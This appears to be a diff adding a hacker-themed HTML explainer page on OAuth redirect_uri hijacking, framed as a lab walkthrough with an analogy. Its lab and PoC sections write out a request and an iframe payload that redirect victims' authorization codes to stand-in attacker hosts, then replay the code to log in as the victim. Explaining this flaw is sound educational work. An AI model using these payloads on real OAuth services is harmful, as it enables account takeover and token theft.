@@ -1,0 +1,239 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OAUTH_HIJACK_EXPLOIT_GUIDE</title>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --neon-green: #39FF14;
+            --neon-cyan: #00FFFF;
+            --neon-red: #FF3131;
+            --terminal-font: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--neon-green);
+            font-family: var(--terminal-font);
+            margin: 0;
+            padding: 20px;
+            line-height: 1.5;
+            overflow-x: hidden;
+        }
+
+        /* Scanline Effect */
+        body::before {
+            content: " ";
+            display: block;
+            position: fixed;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            border: 1px solid var(--neon-green);
+            padding: 20px;
+            box-shadow: 0 0 15px var(--neon-green);
+        }
+
+        header {
+            text-align: center;
+            border-bottom: 2px solid var(--neon-red);
+            margin-bottom: 30px;
+            padding-bottom: 10px;
+        }
+
+        .ascii-art {
+            white-space: pre;
+            font-size: 8px;
+            color: var(--neon-red);
+            text-shadow: 0 0 5px var(--neon-red);
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: var(--neon-cyan);
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            text-shadow: 0 0 10px var(--neon-cyan);
+        }
+
+        .section {
+            margin-bottom: 40px;
+            border-left: 3px solid var(--neon-cyan);
+            padding-left: 20px;
+        }
+
+        .section-title {
+            color: var(--neon-red);
+            font-weight: bold;
+            text-transform: uppercase;
+            margin-bottom: 15px;
+            display: block;
+            text-shadow: 0 0 5px var(--neon-red);
+        }
+
+        .box {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px dashed var(--neon-green);
+            padding: 15px;
+            margin: 10px 0;
+        }
+
+        .highlight { color: var(--neon-cyan); }
+        .warning { color: var(--neon-red); font-weight: bold; }
+
+        .exploit-code {
+            background: #111;
+            padding: 10px;
+            border: 1px solid var(--neon-cyan);
+            color: #ccc;
+            overflow-x: auto;
+        }
+
+        .footer {
+            border-top: 1px solid var(--neon-green);
+            margin-top: 50px;
+            padding-top: 20px;
+            text-align: center;
+            font-size: 1.2em;
+            color: var(--neon-red);
+            text-shadow: 0 0 10px var(--neon-red);
+        }
+
+        /* Glitch Animation */
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+
+        .glitch-text:hover {
+            animation: glitch 0.3s linear infinite;
+        }
+
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <header>
+        <div class="ascii-art">
+  _    _          _____ _  __ ______ _____  
+ | |  | |   /\   / ____| |/ /|  ____|  __ \ 
+ | |__| |  /  \ | |    | ' / | |__  | |__) |
+ |  __  | / /\ \| |    |  <  |  __| |  _  / 
+ | |  | |/ ____ \ |____| . \ | |____| | \ \ 
+ |_|  |_/_/    \_\_____|_|\_\|______|_|  \_\
+        </div>
+        <h1 class="glitch-text">OAuth Redirect URI Hijacking</h1>
+        <p>[ FEYNMAN-STYLE EXPLANATION: SIMPLE ]</p>
+    </header>
+
+    <div class="section">
+        <span class="section-title">0x01: Basic Mechanism</span>
+        <p>In OAuth, after you log in, the system sends back something important to the app:</p>
+        <ul>
+            <li>either an <span class="highlight">authorization code</span></li>
+            <li>or an <span class="highlight">access token</span></li>
+        </ul>
+        <div class="box">
+            👉 This is like a <span class="warning">proof that you are the user</span>.
+        </div>
+        <p>This is sent to a specific place called: <span class="highlight">redirect_uri (callback URL)</span></p>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x02: Where the Problem Happens</span>
+        <p>The OAuth server is supposed to:</p>
+        <ul>
+            <li>only send the code/token to trusted URLs</li>
+        </ul>
+        <p>But if it doesn’t properly check the <span class="warning">redirect_uri</span>, then:</p>
+        <div class="box">
+            👉 An attacker can change it to their own website.
+        </div>
+        <p>So instead of: <code class="highlight">https://legit-app.com/callback</code></p>
+        <p>it becomes: <code class="warning">https://attacker.com</code></p>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x03: The Exploit Chain</span>
+        <ol>
+            <li>Victim logs in (or already has a session)</li>
+            <li>OAuth server generates a code</li>
+            <li>Sends it to: <code class="warning">https://attacker.com?code=XYZ</code></li>
+            <li>Attacker now has the code</li>
+        </ol>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x04: Why this is Critical</span>
+        <p>With that stolen code, the attacker sends it to the real app: <code class="highlight">/callback?code=XYZ</code></p>
+        <p>The app completes login and <span class="warning">attacker is now logged in as the victim.</span></p>
+        <p><strong>No password needed.</strong></p>
+        <div class="box">
+            <small>Important detail: Even protections like 'state' don’t fully stop this, because the attacker starts their own flow and just changes where the response goes.</small>
+        </div>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x05: The Analogy</span>
+        <p>Think of a delivery system:</p>
+        <ul>
+            <li>You order a package <span class="highlight">(OAuth login)</span></li>
+            <li>The company asks: “Where should we deliver it?” <span class="highlight">(redirect_uri)</span></li>
+            <li>Normally: it delivers to your home <span class="highlight">(legit app)</span></li>
+            <li>But if the company doesn’t verify the address: someone changes it to <span class="warning">“Send it to my house instead”</span></li>
+        </ul>
+        <p>👉 Your package (code/token) goes to the attacker.</p>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x06: Real-World Lab Example</span>
+        <p>Request intercepted:</p>
+        <div class="exploit-code">GET /auth?client_id=...&redirect_uri=https://attacker-server.com</div>
+        <p>Resulting redirect:</p>
+        <div class="exploit-code">https://attacker-server.com?code=VICTIM_CODE</div>
+        <p>Check logs &rarr; <span class="warning">VICTIM_CODE ACQUIRED</span></p>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x07: Exploit Flow (PoC)</span>
+        <p>1. Send victim this:</p>
+        <div class="exploit-code">&lt;iframe src="https://oauth-server/auth?...&redirect_uri=attacker.com"&gt;&lt;/iframe&gt;</div>
+        <p>2. Victim loads it &rarr; OAuth runs silently</p>
+        <p>3. Code is sent to attacker</p>
+        <p>4. Attacker uses: <code class="highlight">/oauth-callback?code=VICTIM_CODE</code></p>
+        <p>&rarr; Logged in as victim (admin in lab)</p>
+    </div>
+
+    <div class="section">
+        <span class="section-title">0x08: Root Issue (Technical)</span>
+        <ul>
+            <li>OAuth server does <span class="warning">not validate redirect_uri</span></li>
+            <li>Allows arbitrary external domains</li>
+            <li>Sends sensitive data (code/token) to attacker-controlled endpoint</li>
+        </ul>
+    </div>
+
+    <div class="footer">
+        ONE-LINE TAKEAWAY: <br>
+        If redirect_uri is not strictly validated, attackers can steal authorization codes or tokens, leading to full account takeover.
+    </div>
+</div>
+
+</body>
+</html>
+```
